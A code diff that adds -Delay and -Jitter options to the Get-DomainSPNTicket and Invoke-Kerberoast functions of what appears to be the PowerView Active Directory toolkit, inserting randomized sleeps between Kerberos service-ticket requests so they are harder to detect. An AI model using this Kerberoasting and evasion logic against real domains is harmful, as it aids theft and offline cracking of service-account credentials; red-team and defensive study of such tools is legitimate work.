@@ -487,6 +487,14 @@ Defaults to 'John'.
 A [Management.Automation.PSCredential] object of alternate credentials
 for connection to the remote domain using Invoke-UserImpersonation.
 
+.PARAMETER Delay
+
+Specifies the delay in seconds between ticket requests.
+
+.PARAMETER Jitter
+
+Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
+
 .EXAMPLE
 
 Get-DomainSPNTicket -SPN "HTTP/web.testlab.local"
@@ -543,6 +551,14 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         [String]
         $OutputFormat = 'John',
 
+        [ValidateRange(0,10000)]
+        [Int]
+        $Delay = 0,
+
+        [ValidateRange(0.0, 1.0)]
+        [Double]
+        $Jitter = .3,
+
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
         $Credential = [Management.Automation.PSCredential]::Empty
@@ -563,8 +579,11 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         else {
             $TargetObject = $SPN
         }
+	
+	$RandNo = New-Object System.Random
 
         ForEach ($Object in $TargetObject) {
+
             if ($PSBoundParameters['User']) {
                 $UserSPN = $Object.ServicePrincipalName
                 $SamAccountName = $Object.SamAccountName
@@ -641,6 +660,8 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                 Write-Output $Out
             }
+            # sleep for our semi-randomized interval
+            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
         }
     }
 
@@ -1029,6 +1050,10 @@ Defaults to 'John'.
 .PARAMETER Credential
 A [Management.Automation.PSCredential] object of alternate credentials
 for connection to the target domain.
+.PARAMETER Delay
+Specifies the delay in seconds between ticket requests.
+.PARAMETER Jitter
+Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
 .EXAMPLE
 Invoke-Kerberoast | fl
 Kerberoasts all found SPNs for the current domain.
@@ -1089,6 +1114,14 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
         [Switch]
         $Tombstone,
 
+        [ValidateRange(0,10000)]
+        [Int]
+        $Delay = 0,
+
+        [ValidateRange(0.0, 1.0)]
+        [Double]
+        $Jitter = .3,
+
         [ValidateSet('John', 'Hashcat')]
         [Alias('Format')]
         [String]
@@ -1121,7 +1154,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
 
     PROCESS {
         if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
-        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
+        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter
     }
 
     END {
